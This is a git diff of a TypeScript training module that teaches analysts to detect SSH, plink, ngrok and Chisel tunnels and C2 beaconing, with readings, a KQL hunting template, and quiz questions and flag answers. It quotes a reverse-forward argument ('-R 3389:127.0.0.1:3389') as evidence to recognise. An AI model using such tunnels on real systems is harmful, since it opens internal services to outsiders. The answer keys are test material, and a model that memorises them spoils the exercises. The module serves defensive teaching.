-        `plink (PuTTY Link) is the command-line-only counterpart to the PuTTY SSH client: a small, digitally-signed, entirely legitimate Windows binary that system administrators have used for decades to script SSH connections and port forwards without needing an interactive terminal. Because it's so old, so widely deployed for entirely legitimate administrative scripting, and properly code-signed, many EDR/allowlisting policies either explicitly trust it or simply never flag it by default, which is precisely why attackers favor it specifically for scripting exactly the -L/-R/-D forwarding techniques from Reading 1 on Windows hosts, where a native SSH client historically wasn't always present (on current Windows, watch the built-in ssh.exe for the same arguments). Seeing plink.exe launched from an unusual location (a temp or downloads directory rather than a standard admin toolkit path), by an account or in a context with no history of using it, is the key behavioral differentiator, not the mere fact that plink.exe exists or ran at all.\n\n` +
+        `plink (PuTTY Link) is the command-line-only counterpart to the PuTTY SSH client: a small, digitally-signed, entirely legitimate Windows binary that system administrators have used for decades to script SSH connections and port forwards without needing an interactive terminal. Because it's so old, so widely deployed for entirely legitimate administrative scripting, and properly code-signed, many EDR/allowlisting policies either explicitly trust it or simply never flag it by default, which is precisely why attackers favor it specifically for scripting exactly the -L/-R/-D forwarding techniques from Reading 1 on Windows hosts, where a native SSH client historically wasn't always present. Seeing plink.exe launched from an unusual location (a temp directory rather than a standard admin toolkit path, as in this room's log analysis exercise), by an account or in a context with no history of using it, is the key behavioral differentiator, not the mere fact that plink.exe exists or ran at all.\n\n` +
         `**The common thread**\n\n` +
         `All three tools share the same appeal: legitimate, often signed, widely available, and genuinely dual-use, which means detection has to rely on CONTEXT (is this host/account/location one that has any business reason to run this tool at all), BEHAVIOR (connection duration, destination, traffic shape), and CORRELATION (does this coincide with other suspicious activity), rather than simply alerting on the tool's mere presence, which would produce a constant stream of benign true positives (the rule correctly sees the tool, but the use is authorized administrative or developer work) that buries the rare malicious run.`,
       codeExample:
@@ -413,6 +373,94 @@ const tunnelingRoom = {
         "=======================================================",
     },
 
+    // ── Reading 6: investigation playbook ────────────────────────────────────
+    {
+      type: "reading" as const,
+      id: "tunnel-r6",
+      heading: "Putting It Together: A Tunneling Investigation Playbook",
+      content:
+        `Every technique in this room produces overlapping but distinguishable evidence across process, network, DNS, and TLS telemetry. This final reading is the checklist that ties them together into a repeatable investigation sequence.\n\n` +
+        `**Step 1: Process ancestry and command line**\n\n` +
+        `Start at the endpoint if you have process telemetry available: what launched this connection, and what's the FULL command line? A bare "ssh" or "plink.exe" launch tells you little; the same launch WITH -R 3389:127.0.0.1:3389 visible in the command line tells you exactly what direction and what service is being forwarded, immediately. This single step is often the fastest way to fully understand what a suspicious long-lived connection actually is, and it's information that simply doesn't exist in network-only telemetry at all.\n\n` +
+        `**Step 2: Destination reputation and rarity**\n\n` +
+        `Has this destination (IP, domain, or ASN) ever been contacted by any host on your network before? By how many hosts, and how often? A destination that's brand new to your entire environment, contacted by exactly one host, is a very different starting point than a destination your organization has used routinely for months.\n\n` +
+        `**Step 3: Connection duration and byte pattern**\n\n` +
+        `Is this a short, transactional connection (consistent with a normal request/response) or an unusually long-lived one (consistent with an interactive tunnel or pivot session kept open for hours)? Is the byte pattern symmetric/bursty (interactive shell activity) or beacon-shaped (small, consistent, regularly repeating)?\n\n` +
+        `**Step 4: DNS and TLS metadata**\n\n` +
+        `If the connection is HTTPS, what does the SNI reveal (a known tunneling-SaaS domain like *.ngrok.io, an unfamiliar/self-signed-certificate destination)? What's the JA3/JA3S? Were there DNS queries immediately preceding this connection that themselves showed tunneling-statistical anomalies (high entropy, TXT-heavy, high query rate), sometimes the C2 channel itself IS the DNS traffic, rather than a separate follow-on TCP/TLS connection.\n\n` +
+        `**Step 5: Correlate with everything else happening on that host and account**\n\n` +
+        `Does this coincide with other suspicious activity: a recent phishing click, an unusual authentication event, a process that shouldn't be there, files recently dropped into an unusual directory (like Temp, as seen with plink.exe in this room's log analysis)? A single, isolated finding is weaker evidence than the same finding appearing alongside two or three other unrelated-looking anomalies on the same host in the same time window.\n\n` +
+        `**Step 6, Check for a legitimate explanation BEFORE escalating: verify with the asset/change owner**\n\n` +
+        `Given how genuinely dual-use every technique and tool in this room is. Legitimate SSH tunneling for IT support, legitimate ngrok use by developers, legitimate Chisel use by an approved penetration test, legitimate plink.exe scripting by sysadmins, the final, essential step before treating any of these findings as confirmed malicious is checking for a documented, verifiable business explanation: an open change ticket, a known approved tool deployment, confirmation from the account owner or their manager, or a scheduled penetration test's rules of engagement. This is the industry practice of verifying with the asset or change owner (in this platform, the outcome is recorded as it_verify_result): "confirmed" means a legitimate explanation exists and this is very likely a benign true positive (the detection correctly caught real tool use, and that use is authorized), not a false positive, because nothing misfired; "unverified" (or no ticket found at all) means the finding should be escalated and investigated as a real possibility, not dismissed. Skipping this step in either direction. Either escalating every instance of a dual-use tool reflexively, or dismissing every instance because "that tool is sometimes used legitimately". Is exactly the failure mode this entire room has been building you toward avoiding.`,
+      codeExample:
+        "THE SIX-STEP TUNNELING INVESTIGATION SEQUENCE\n" +
+        "=======================================================\n" +
+        "1. Process ancestry + full command line (if available)\n" +
+        "   -- reveals -L/-R/-D, the tool, and its exact args\n" +
+        "2. Destination reputation + rarity\n" +
+        "   -- first-seen? by how many hosts, how often?\n" +
+        "3. Connection duration + byte pattern\n" +
+        "   -- short/transactional, long-lived interactive, or\n" +
+        "      beacon-shaped (small, consistent, repeating)?\n" +
+        "4. DNS + TLS metadata\n" +
+        "   -- SNI, JA3/JA3S, preceding DNS anomalies\n" +
+        "5. Correlate with other activity on the same host/account\n" +
+        "   -- phishing click, odd auth event, dropped file, etc.\n" +
+        "6. Check for a documented, legitimate explanation\n" +
+        "   -- it_verify_result: confirmed -> likely BTP\n" +
+        "   -- it_verify_result: unverified/none found -> escalate\n" +
+        "=======================================================",
+      checkpoint: {
+        question:
+          "According to the reading's six-step investigation playbook, what does an it_verify_result of 'confirmed' indicate?",
+        options: [
+          "it_verify_result records which analyst reviewed the alert, and says nothing about the activity itself",
+          "A legitimate, documented business explanation exists for the activity, making it very likely a benign true positive",
+          "An incident responder has finished forensic analysis of the tool's binary and proved malicious intent",
+          "The host has been confirmed compromised, so the playbook's next step is to isolate it from the network",
+        ],
+        answer: 1,
+        explanation:
+          "it_verify_result 'confirmed' means the asset or change owner confirmed a documented business explanation (a change ticket, an approved tool deployment, account-owner confirmation), making the finding very likely a benign true positive: the detection caught real activity, and the confirmation is the justification that makes it authorized. It is not a false positive, because the rule did not misfire. It is not a reviewer-tracking field, and it is not the output of malware forensics. It also points the opposite way from confirmed compromise: 'confirmed' supports closing, while 'unverified' is what drives escalation and containment.",
+      },
+    },
+
+    // ── Question 1 ────────────────────────────────────────────────────────
+    {
+      type: "question" as const,
+      id: "tunnel-q1",
+      question:
+        "An internal server initiates an outbound SSH connection to an external host using the -R flag with arguments forwarding its own local port 3389. What does this specific flag and direction indicate, and why is it considered more dangerous than a -L forward?",
+      options: [
+        "-R is a dynamic SOCKS proxy that lets the internal server reach out through the external host, no riskier than -L",
+        "-R opens a listener on the external host that leads back to this server's port 3389: inbound reach over an outbound link",
+        "-R forwards the external host's own local port into the internal network, so it only matters if the server listens",
+        "-R tunnels only port 3389 outbound in a restricted relay mode; the danger is data leaving, not access coming in",
+      ],
+      answer: 1,
+      explanation:
+        "As covered in Reading 1, -R creates a listener on the remote/external side that tunnels back to a local service on the machine that initiated the connection, so an external party reaches INTO the internal network through a tunnel that was only ever an OUTBOUND connection, sidestepping inbound firewall rules. -L, by contrast, only lets the initiating machine reach OUT through the remote side. The SOCKS-proxy option describes -D, not -R. The option claiming the external host's own port is forwarded inward reverses which side's service is exposed. The 'restricted relay, data leaving' option misses the point: the forwarded service is reached from outside, so the risk is inbound access, not just outbound data.",
+      xp: 25,
+    },
+
+    // ── Question 2 ────────────────────────────────────────────────────────
+    {
+      type: "question" as const,
+      id: "tunnel-q2",
+      question:
+        "A C2 beacon is configured with a 90-second interval and 30% jitter, applied symmetrically (± around the base). Which observed inter-arrival delta falls OUTSIDE the expected jittered band, and therefore does not fit this beacon profile on its own?",
+      options: [
+        "66 seconds",
+        "114 seconds",
+        "60 seconds",
+        "88 seconds",
+      ],
+      answer: 2,
+      explanation:
+        "With a 90-second interval and symmetric 30% jitter, the band runs from 90 minus 27 (63 seconds) to 90 plus 27 (117 seconds). 66 and 114 seconds sit near the edges but inside the band, and 88 seconds is close to the base, so all three fit. 60 seconds is just below the 63-second floor, reading 30% as ±30 seconds (a 60–120 band) would wrongly accept it. A gap outside the band means either it came from a different cause or the beacon's real configuration differs from what is assumed.",
+      xp: 30,
+    },
+
     // ── Question 3 ────────────────────────────────────────────────────────
     {
       type: "question" as const,
@@ -429,99 +477,6 @@ const tunnelingRoom = {
       explanation:
         "As Reading 5 emphasizes, the tool's own legitimacy doesn't resolve the investigation. What matters is whether THIS HOST has any business reason to use it, and a production database server has none for a developer tunneling service. TLS protects the data from eavesdroppers, not from the attacker at the other end of the tunnel, so encryption is no reason to clear it. Shared cloud IPs make IP reputation weak, which is a reason to rely on context, not to close the alert. A random ngrok subdomain is fresh, legitimate infrastructure that a blocklist is unlikely to list, so a blocklist miss would wrongly clear a server that should never be using a tunnel at all.",
       xp: 25,
-    },
-
-    // ── Matching: tunneling technique <-> mechanism ─────────────────────────
-    {
-      type: "matching" as const,
-      id: "tunnel-m1",
-      heading: "Match Each Tunneling Technique or Tool to Its Core Mechanism",
-      instructions: "Match each technique/tool to how it actually works at the protocol/mechanism level.",
-      pairs: [
-        { id: "sshL", left: "SSH -L (local forward)", right: "Opens a listener on the initiating machine that tunnels OUT to a service reachable from the remote side" },
-        { id: "sshR", left: "SSH -R (remote forward)", right: "Opens a listener on the REMOTE side that tunnels back IN to a service on the initiating machine: the dangerous, firewall-bypassing direction" },
-        { id: "sshD", left: "SSH -D (dynamic forward)", right: "Turns the local machine into a full SOCKS proxy, allowing any application to reach any destination reachable from the remote side" },
-        { id: "icmp", left: "ICMP tunneling", right: "Encodes arbitrary command/data payload inside ICMP echo request/reply packets, abusing the unused padding field ping normally sends" },
-        { id: "ngrokmech", left: "ngrok", right: "Creates a public tunnel to a local service entirely through ngrok's own cloud infrastructure, requiring no inbound firewall changes or public IP on the target end" },
-        { id: "chisel", left: "Chisel", right: "A single-file, dependency-free binary that tunnels TCP/UDP over HTTP, frequently paired with SOCKS proxy functionality for pivoting" },
-      ],
-      explanation:
-        "Each technique moves data through a different mechanism, but they share a common theme: all of them ride on protocols or infrastructure that is either encrypted, widely trusted, or both, specifically to blend in with legitimate traffic. Recognizing the exact mechanism, which direction a listener opens, what protocol carries the payload, what infrastructure is involved, is what lets an analyst predict exactly which log source and which specific field will contain the evidence.",
-      xp: 40,
-    },
-
-    // ── Reading 6: investigation playbook ────────────────────────────────────
-    {
-      type: "reading" as const,
-      id: "tunnel-r6",
-      heading: "Putting It Together: A Tunneling Investigation Playbook",
-      content:
-        `Every technique in this room produces overlapping but distinguishable evidence across process, network, DNS, and TLS telemetry. This final reading is the checklist that ties them together into a repeatable investigation sequence.\n\n` +
-        `**Step 1: Process ancestry and command line**\n\n` +
-        `Start at the endpoint if you have process telemetry available: what launched this connection, and what's the FULL command line? A bare "ssh" or "plink.exe" launch tells you little; the same launch WITH -R 3389:127.0.0.1:3389 visible in the command line tells you exactly what direction and what service is being forwarded, immediately. This single step is often the fastest way to fully understand what a suspicious long-lived connection actually is, and it's information that simply doesn't exist in network-only telemetry at all.\n\n` +
-        `**Step 2: Destination reputation and rarity**\n\n` +
-        `Has this destination (IP, domain, or ASN) ever been contacted by any host on your network before? By how many hosts, and how often? A destination that's brand new to your entire environment, contacted by exactly one host, is a very different starting point than a destination your organization has used routinely for months. Watch for the opposite trick too: a host that resolves many never-seen, random-looking domain names, or one name whose IP keeps changing every few minutes, may be using Dynamic Resolution (ATT&CK T1568: domain generation algorithms or fast flux) so that no single destination stays around long enough to be blocked.\n\n` +
-        `**Step 3: Connection duration and byte pattern**\n\n` +
-        `Is this a short, transactional connection (consistent with a normal request/response) or an unusually long-lived one (consistent with an interactive tunnel or pivot session kept open for hours)? Is the byte pattern symmetric/bursty (interactive shell activity) or beacon-shaped (small, consistent, regularly repeating)?\n\n` +
-        `**Step 4: DNS and TLS metadata**\n\n` +
-        `If the connection is HTTPS, what does the SNI reveal (a known tunneling-SaaS domain like *.ngrok.io, an unfamiliar/self-signed-certificate destination)? What TLS client fingerprint does it carry? JA3 hashes the fields of the TLS ClientHello in the order they are sent, and since early 2023 Chrome and other browsers shuffle their extension order on every connection, so a browser's JA3 changes constantly. JA4 (with JA4S for the server side) sorts the values before hashing and stays stable, which makes it the better pivot today: a fingerprint that matches a known tunneling or C2 client on a server that never runs that client is a strong lead, and the same fingerprint on other hosts helps you scope. Were there DNS queries immediately preceding this connection that themselves showed tunneling-statistical anomalies (high entropy, TXT-heavy, high query rate)? Sometimes the C2 channel itself IS the DNS traffic, rather than a separate follow-on TCP/TLS connection.\n\n` +
-        `**Step 5: Correlate with everything else happening on that host and account**\n\n` +
-        `Does this coincide with other suspicious activity: a recent phishing click, an unusual authentication event, a process that shouldn't be there, files recently dropped into an unusual directory (a Temp or Downloads folder)? A single, isolated finding is weaker evidence than the same finding appearing alongside two or three other unrelated-looking anomalies on the same host in the same time window.\n\n` +
-        `**Step 6: Check for a legitimate explanation BEFORE escalating: verify with the asset/change owner**\n\n` +
-        `Every technique and tool in this room is genuinely dual-use: legitimate SSH tunneling for IT support, legitimate ngrok use by developers, legitimate Chisel use by an approved penetration test, legitimate plink.exe scripting by sysadmins. So the essential step before treating any of these findings as confirmed malicious is checking for a documented, verifiable business explanation: an open change ticket, a known approved tool deployment, confirmation from the account owner or their manager, or a scheduled penetration test's rules of engagement. This is the industry practice of verifying with the asset or change owner (in this platform, the outcome is recorded as it_verify_result): "confirmed" means a legitimate explanation exists and this is very likely a benign true positive (the detection correctly caught real tool use, and that use is authorized), not a false positive, because nothing misfired; "unverified" (or no ticket found at all) means the finding should be escalated and investigated as a real possibility, not dismissed. Skipping this step in either direction (escalating every instance of a dual-use tool reflexively, or dismissing every instance because "that tool is sometimes used legitimately") is exactly the failure mode this room is building you toward avoiding.\n\n` +
-        `**Once a channel is confirmed: preserve, scope, contain, eradicate, watch, document**\n\n` +
-        `Confirming one malicious channel starts the response; it does not end it. The order below matters because each step protects or feeds the next one.\n\n` +
-        `1. **Preserve volatile evidence first.** While the implant is still running, capture the host's memory and its live process and connection lists. Do not restart the service, reboot or reimage yet: in-memory code, injected threads and the live connection disappear with them, and with them your answer to "how did this get here and what did it touch".\n\n` +
-        `2. **Scope before you act.** Take the indicators that host gave you (the destination host name and IP, the file hash, the TLS fingerprint, the account that launched the tool) and search every host's proxy, DNS, firewall and EDR data for them. Attackers rarely keep a single foothold, and the moment one channel is cut, a careful operator switches to a second implant or channel you have not found yet. A SIEM search takes minutes, so scoping first costs little; the exception is active, ongoing data loss from a critical system, where you isolate that host at once and scope immediately after.\n\n` +
-        `3. **Contain in one coordinated action.** Network-isolate every confirmed host at the same time (EDR network containment keeps the EDR's own channel open so you can keep investigating) and block the destination at the egress proxy, firewall and DNS resolver. Blocking only the destination is not containment: the foothold stays, and the attacker simply moves to a new subdomain, IP or protocol.\n\n` +
-        `4. **Eradicate.** On the isolated hosts, remove whatever relaunches the implant (a scheduled task, service, Run key or SQL Server job), reset or disable the accounts it used or could reach, and close the hole that let it in.\n\n` +
-        `5. **Watch for the re-beacon.** Before releasing any host from isolation, monitor proxy and DNS logs for the same timing pattern or fingerprint reaching a new destination. A re-beacon means eradication missed something.\n\n` +
-        `6. **Document.** The incident record lists the timeline, the indicators, every affected host and account, each action taken and when, and the techniques mapped to MITRE ATT&CK, so the next analyst and the detection engineers can reuse it.\n\n` +
-        `**Mapping what you found to ATT&CK**\n\n` +
-        `Use the mapping the earlier readings introduced: SSH, Chisel or ngrok tunnels are Protocol Tunneling (T1572); SOCKS relays through victim hosts are Proxy (T1090, with .001 Internal Proxy and .003 Multi-hop Proxy); HTTP(S) beacons are Web Protocols (T1071.001) and DNS C2 is T1071.004; TLS around the channel is Encrypted Channel (T1573); ICMP or raw TCP shells are Non-Application Layer Protocol (T1095); a service moved to an unusual port, such as SSH on 443, is Non-Standard Port (T1571); and rotating domains or IPs are Dynamic Resolution (T1568). One channel often maps to several of these at once.`,
-      codeExample:
-        "THE TUNNELING INVESTIGATION SEQUENCE (ALERT-LED)\n" +
-        "=======================================================\n" +
-        "1. Process ancestry + full command line (if available)\n" +
-        "   -- reveals -L/-R/-D, the tool, and its exact args\n" +
-        "2. Destination reputation + rarity\n" +
-        "   -- first-seen? by how many hosts, how often?\n" +
-        "3. Connection duration + byte pattern\n" +
-        "   -- short/transactional, long-lived interactive, or\n" +
-        "      beacon-shaped (small, consistent, repeating)?\n" +
-        "4. DNS + TLS metadata\n" +
-        "   -- SNI, JA4/JA4S (JA3 is unstable for browsers),\n" +
-        "      preceding DNS anomalies\n" +
-        "5. Correlate with other activity on the same host/account\n" +
-        "   -- phishing click, odd auth event, dropped file, etc.\n" +
-        "6. Check for a documented, legitimate explanation\n" +
-        "   -- it_verify_result: confirmed -> likely BTP\n" +
-        "   -- it_verify_result: unverified/none found -> escalate\n" +
-        "=======================================================\n\n" +
-        "ONCE A CHANNEL IS CONFIRMED\n" +
-        "=======================================================\n" +
-        "Preserve  memory + live connections; no restart/reimage\n" +
-        "Scope     search all hosts for the host name, IP, hash,\n" +
-        "          TLS fingerprint and account\n" +
-        "Contain   isolate every confirmed host AND block the\n" +
-        "          destination, in one coordinated action\n" +
-        "Eradicate persistence, credentials, the entry hole\n" +
-        "Watch     re-beacon to a new destination before release\n" +
-        "Document  timeline, IOCs, hosts, actions, ATT&CK IDs\n" +
-        "=======================================================",
-      checkpoint: {
-        question:
-          "According to the reading's investigation playbook, what does an it_verify_result of 'confirmed' indicate?",
-        options: [
-          "it_verify_result records which analyst reviewed the alert, and says nothing about the activity itself",
-          "A legitimate, documented business explanation exists for the activity, making it very likely a benign true positive",
-          "An incident responder has finished forensic analysis of the tool's binary and proved malicious intent",
-          "The host has been confirmed compromised, so the playbook's next step is to isolate it from the network",
-        ],
-        answer: 1,
-        explanation:
-          "it_verify_result 'confirmed' means the asset or change owner confirmed a documented business explanation (a change ticket, an approved tool deployment, account-owner confirmation), making the finding very likely a benign true positive: the detection caught real activity, and the confirmation is the justification that makes it authorized. It is not a false positive, because the rule did not misfire. It is not a reviewer-tracking field, and it is not the output of malware forensics. It also points the opposite way from confirmed compromise: 'confirmed' supports closing, while 'unverified' is what drives escalation and containment.",
-      },
     },
 
     // ── Log Analysis 1: plink.exe reverse tunnel ─────────────────────────────
@@ -578,18 +533,6 @@ const tunnelingRoom = {
       ],
     },
 
-    // ── Flag ──────────────────────────────────────────────────────────────
-    {
-      type: "flag" as const,
-      id: "tunnel-f1",
-      prompt:
-        "Go back to Log Analysis 1, the plink.exe event on SRV-APP12. The egress firewall only ever sees the outer SSH connection that carries the tunnel. Which destination TCP port will the firewall record for that connection? Enter the number only.",
-      answer: "443",
-      hint: "In plink's command line, the ports inside the forwarding specification are not the port of the SSH server itself: a separate flag sets that.",
-      xp: 25,
-      logTask: "tunnel-la1",
-    },
-
     // ── Log Analysis 2: ngrok beacon investigation ───────────────────────────
     {
       type: "log_analysis" as const,
@@ -624,7 +567,7 @@ const tunnelingRoom = {
           ],
           answer: 1,
           explanation:
-            "The beacon is attributed to the core database engine, not an unrelated utility. That points to code executing inside or through SQL Server (for example a malicious CLR assembly or extended stored procedure DLL loaded into the engine; a command run through xp_cmdshell would instead show up as a child process such as cmd.exe), far more severe than a monitoring agent making the same connection. The attribution is not a guess: the context says it comes from the EDR join, not from the proxy, which indeed cannot see processes. Routine licensing or telemetry calls would not go to a random ngrok tunnel domain, and the host's documented policy allows only the app tier and backups. If an admin's ngrok client were relaying to SQL Server, the outbound sessions to ngrok would belong to ngrok.exe, not to sqlservr.exe.",
+            "The beacon is attributed to the core database engine, not an unrelated utility. That points to code executing inside or through SQL Server (for example via SQL injection leading to command execution, or a malicious extended stored procedure), far more severe than a monitoring agent making the same connection. The attribution is not a guess: the context says it comes from the EDR join, not from the proxy, which indeed cannot see processes. Routine licensing or telemetry calls would not go to a random ngrok tunnel domain, and the host's documented policy allows only the app tier and backups. If an admin's ngrok client were relaying to SQL Server, the outbound sessions to ngrok would belong to ngrok.exe, not to sqlservr.exe.",
           xp: 30,
         },
         {
@@ -638,52 +581,10 @@ const tunnelingRoom = {
           ],
           answer: 1,
           explanation:
-            "A production database engine beaconing to a tunneling service with no business justification is an active compromise, and Reading 6's response steps apply: contain it by isolating the host while preserving forensic evidence, block the tunnel destination, investigate how code ran inside SQL Server (extended stored procedures, unusual child processes, injection in query logs), and treat the data as potentially exposed. Blocking the domain alone leaves the foothold in place (the attacker can switch to another ngrok subdomain or channel) so closing the alert is premature. Restarting the service destroys in-memory evidence and delays escalation of a confirmed beacon. Reimaging right away also wipes the evidence needed to learn how the engine was compromised and what data was touched, so the same hole may be reopened.",
+            "A production database engine beaconing to a tunneling service with no business justification is an active compromise: contain it by isolating the host while preserving forensic evidence, block the tunnel destination, investigate how code ran inside SQL Server (extended stored procedures, unusual child processes, injection in query logs), and treat the data as potentially exposed. Blocking the domain alone leaves the foothold in place (the attacker can switch to another ngrok subdomain or channel) so closing the alert is premature. Restarting the service destroys in-memory evidence and delays escalation of a confirmed beacon. Reimaging right away also wipes the evidence needed to learn how the engine was compromised and what data was touched, so the same hole may be reopened.",
           xp: 30,
         },
       ],
-    },
-
-    // ── Ordering: beacon detection workflow ──────────────────────────────────
-    {
-      type: "ordering" as const,
-      id: "tunnel-o1",
-      heading: "Order the Beacon Detection Workflow",
-      instructions: "You are running a beacon hunt that starts from proxy logs only: no endpoint alert exists yet, so you do not know which host or process to look at. Each step below consumes the output of the step before it. Arrange them in that dependency order.",
-      items: [
-        { id: "collect", text: "Pull every proxy-log connection timestamp for each host/destination pair over a multi-hour window" },
-        { id: "deltas", text: "Turn each pair's timestamp list into inter-arrival deltas (the gap between successive connections)" },
-        { id: "band", text: "From those deltas, compute mean and standard deviation to test for a tight, bounded cluster" },
-        { id: "bytes", text: "Combine the clustering result with repetition count and bytes-per-connection consistency into a beacon score" },
-        { id: "rarity", text: "Keep only the high-scoring pairs whose destination is rare across the environment, dropping widely used services" },
-        { id: "ancestry", text: "On each host that survives that filter, pivot to endpoint telemetry to find the owning process and its command line" },
-        { id: "verdict", text: "With the owning process identified, check for a documented legitimate explanation, then close or escalate" },
-      ],
-      correct_order: ["collect", "deltas", "band", "bytes", "rarity", "ancestry", "verdict"],
-      explanation:
-        "Each step needs the previous step's output: timestamps must exist before deltas can be computed; deltas before their mean and spread; the clustering result before it can be scored together with repetition and byte consistency; scores before the high-scoring pairs can be filtered by destination rarity (which removes busy update/telemetry services that also look regular); the surviving hosts before you know where to pull endpoint process context; and the owning process before you can ask its owner for a legitimate explanation and decide. Reading 6 puts process ancestry first when an endpoint alert already names the process. In a hunt that starts from network data alone, you only reach the endpoint once the timing math has told you which host to look at.",
-      xp: 35,
-    },
-
-    // ── Query Fill: KQL to surface beacon-shaped connections by interval ────
-    {
-      type: "query_fill" as const,
-      id: "tunnel-qf1",
-      heading: "Write It Yourself: Surface Beacon-Shaped Connections in KQL",
-      language: "kql",
-      context:
-        "Turn the pattern from Log Analysis 2 into a one-hour hunt over Defender for Endpoint network events. The rows are sorted per device and destination so prev() can compute each gap, and the first row of every pair gets a null gap. Requirements: (1) HTTPS only; (2) measure the SPREAD of the gaps, not their average, Reading 4's signal is tight clustering; (3) the count threshold must ignore pairs with fewer than 10 connections in the hour, yet still keep a beacon that sleeps at most 120 seconds (about 30 connections per hour); (4) the spread threshold, a whole number of seconds, must keep Log Analysis 2's beacon (standard deviation 6.8 s) while dropping human browsing, whose gaps typically vary with a standard deviation of 30 s or more.",
-      template:
-        "DeviceNetworkEvents\n| where Timestamp > ago(1h)\n| where RemotePort == {{port}}\n| sort by DeviceName asc, RemoteUrl asc, Timestamp asc\n| extend Delta = iff(DeviceName == prev(DeviceName) and RemoteUrl == prev(RemoteUrl), datetime_diff('second', Timestamp, prev(Timestamp)), long(null))\n| summarize ConnectionCount = count(), AvgDelta = avg(Delta), StdDelta = {{agg}}(Delta) by DeviceName, RemoteUrl\n| where ConnectionCount > {{threshold}} and StdDelta < {{maxstd}}",
-      blanks: [
-        { id: "port", answers: ["443"], placeholder: "standard HTTPS port" },
-        { id: "agg", answers: ["stdev", "stdevp"], placeholder: "KQL aggregation that measures the spread of the gaps" },
-        { id: "threshold", answers: ["9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29"], placeholder: "connection-count threshold (see requirement 3)" },
-        { id: "maxstd", answers: ["7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30"], placeholder: "maximum standard deviation in whole seconds (see requirement 4)" },
-      ],
-      explanation:
-        "RemotePort == 443 limits the hunt to HTTPS. Sorting by device, destination and time serializes the rows so prev() works, and the iff() stops a gap from being computed across two different device/destination pairs. stdev (or the population variant stdevp) measures how tightly the gaps cluster (the beacon signal from Reading 4) whereas an average alone cannot tell a tight 60 s beacon from human traffic that happens to average 60 s. For the count, ConnectionCount > N drops pairs with 9 or fewer connections only if N is at least 9, and keeps a 30-connection beacon only if N is at most 29, so any value from 9 to 29 is correct. For the spread, StdDelta < X keeps Log Analysis 2 (6.8 s) only if X is at least 7, and drops a standard deviation of 30 s only if X is at most 30, so any whole number from 7 to 30 is correct.",
-      xp: 35,
     },
 
     // ── Analyst Choice: approved pentest / verified dev use benign true positive trap ──────────
@@ -724,60 +625,80 @@ const tunnelingRoom = {
       explanation:
         "The ngrok SNI is the same as in Log Analysis 2, but the surrounding evidence differs on every axis that matters: the process is ngrok.exe (the developer's own tunneling client) on a developer laptop, not sqlservr.exe on a production database server; and it_verify_result confirms a standing, documented, six-month-old exception specifically authorizing this exact behavior for this exact user, the timing precisely matches a scheduled calendar event (a sprint demo, the documented legitimate use case), the connection count is a single session (not dozens of repeating beacon-shaped connections), and the duration (44 minutes) matches a plausible meeting length rather than an indefinitely-sustained tunnel. This is exactly the dual-use, legitimate case Reading 5 described. That makes this a benign true positive: the rule correctly caught a real ngrok tunnel, and the standing exception plus the calendar entry are the justification you cite when closing it. It is not a false positive, because nothing misfired, and that label would invite weakening the ngrok rule that also caught the real compromise on SRV-DB07.",
       fp_trap:
-        "After Log Analysis 2's finding that an ngrok connection from a database server was a serious active compromise, it's tempting to treat ANY ngrok traffic as inherently high-severity from now on. But the room was explicit throughout: the tool's presence alone is never sufficient; context is everything. Here, unlike the database server case, there IS a documented business justification, an authorized user with a standing exception, a single (not repeating/beacon-shaped) session, and calendar corroboration, none of which existed in the malicious example. Escalating this identically to the database server finding, purely because both involve the string 'ngrok', would ignore every contextual differentiator the readings taught you to weigh.",
+        "After Log Analysis 2's finding that an ngrok connection from a database server was a serious active compromise, it's tempting to treat ANY ngrok traffic as inherently high-severity from now on. But the room was explicit throughout: the tool's presence alone is never sufficient; context is everything. Here, unlike the database server case, there IS a documented business justification, an authorized user with a standing exception, a single (not repeating/beacon-shaped) session, and calendar corroboration, none of which existed in the malicious example. Escalating this identically to the database server finding, purely because both involve the string 'ngrok', would ignore every contextual differentiator this room has spent six readings teaching you to weigh.",
       xp: 30,
     },
 
-    // ── Ordering: contain the confirmed channel ──────────────────────────────
+    // ── Matching: tunneling technique <-> mechanism ─────────────────────────
+    {
+      type: "matching" as const,
+      id: "tunnel-m1",
+      heading: "Match Each Tunneling Technique or Tool to Its Core Mechanism",
+      instructions: "Match each technique/tool to how it actually works at the protocol/mechanism level.",
+      pairs: [
+        { id: "sshL", left: "SSH -L (local forward)", right: "Opens a listener on the initiating machine that tunnels OUT to a service reachable from the remote side" },
+        { id: "sshR", left: "SSH -R (remote forward)", right: "Opens a listener on the REMOTE side that tunnels back IN to a service on the initiating machine: the dangerous, firewall-bypassing direction" },
+        { id: "sshD", left: "SSH -D (dynamic forward)", right: "Turns the local machine into a full SOCKS proxy, allowing any application to reach any destination reachable from the remote side" },
+        { id: "icmp", left: "ICMP tunneling", right: "Encodes arbitrary command/data payload inside ICMP echo request/reply packets, abusing the unused padding field ping normally sends" },
+        { id: "ngrokmech", left: "ngrok", right: "Creates a public tunnel to a local service entirely through ngrok's own cloud infrastructure, requiring no inbound firewall changes or public IP on the target end" },
+        { id: "chisel", left: "Chisel", right: "A single-file, dependency-free binary that tunnels TCP/UDP over HTTP, frequently paired with SOCKS proxy functionality for pivoting" },
+      ],
+      explanation:
+        "Each technique moves data through a different mechanism, but they share a common theme: all of them ride on protocols or infrastructure that is either encrypted, widely trusted, or both, specifically to blend in with legitimate traffic. Recognizing the exact mechanism, which direction a listener opens, what protocol carries the payload, what infrastructure is involved. Is what lets an analyst predict exactly which log source and which specific field will contain the evidence.",
+      xp: 40,
+    },
+
+    // ── Ordering: beacon detection workflow ──────────────────────────────────
     {
       type: "ordering" as const,
-      id: "tunnel-o2",
-      heading: "Contain the SRV-DB07 Channel",
-      instructions: "The SRV-DB07 beacon from Log Analysis 2 is confirmed malicious and the database data is not being copied out right now. You lead the response. Put the actions in the order Reading 6 sets for a confirmed channel, where each step protects or feeds the one after it.",
+      id: "tunnel-o1",
+      heading: "Order the Beacon Detection Workflow",
+      instructions: "You are running a beacon hunt that starts from proxy logs only: no endpoint alert exists yet, so you do not know which host or process to look at. Each step below consumes the output of the step before it. Arrange them in that dependency order.",
       items: [
-        { id: "contain", text: "In one coordinated change, network-isolate SRV-DB07 and every host the search found, and block the tunnel destination at the proxy, firewall and DNS resolver" },
-        { id: "document", text: "Write the incident record: timeline, indicators, affected hosts and accounts, actions taken, and the ATT&CK techniques" },
